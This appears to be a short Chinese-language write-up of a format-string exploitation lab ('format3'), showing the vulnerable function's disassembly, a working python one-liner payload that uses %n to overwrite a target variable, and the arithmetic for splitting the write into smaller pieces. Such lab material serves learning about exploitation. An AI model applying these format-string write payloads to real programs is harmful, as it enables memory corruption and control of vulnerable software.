![](http://imcczy.b0.upaiyun.com/2016-09-07-10%3A09%3A29.jpg)
```
public vuln
vuln proc near

s= byte ptr -208h
...
call    _fgets
lea     eax, [ebp+s]
mov     [esp], eax      ; format
call    printbuffer
mov     eax, ds:target
cmp     eax, 1025544h
jnz     short loc_80484B7
```
0x1025544需要四个字节，一次写入也可以,但是不太优雅。
```
➜  format3 python -c 'print "\xf4\x96\x04\x08"+"%16930112d"+"%12$n"' |  ./format3
```
分多次写入即可
将0x1025544拆成0x102，0x55，0x44即258，85，68。三个地址站12个字节，所以第一个低地址需68-12=56，第二个地址需85-68=17，以此类推
![](http://imcczy.b0.upaiyun.com/2016-09-07-10%3A15%3A47.jpg)